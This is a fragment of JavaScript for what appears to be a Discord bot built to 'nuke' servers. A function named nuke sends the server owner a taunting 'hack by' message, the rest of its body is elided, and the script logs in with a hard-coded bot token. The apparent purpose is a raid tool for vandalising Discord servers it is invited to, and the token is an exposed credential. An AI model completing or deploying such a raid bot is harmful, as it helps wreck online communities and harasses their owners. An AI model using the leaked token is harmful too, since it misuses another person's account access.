...
async function nuke(guild) {
  ...
  await guild.owner.send(' hack by 💥Moscow⚡⚡⚡#8176 知恵 : ⚠').catch(e => { return void e; });
...
LOka.login("NTg0OTAyMzAzODMyODY2ODM1.XPRrTQ.SjEsUIV8fLo8L3Iy1MgdzME_FLo")
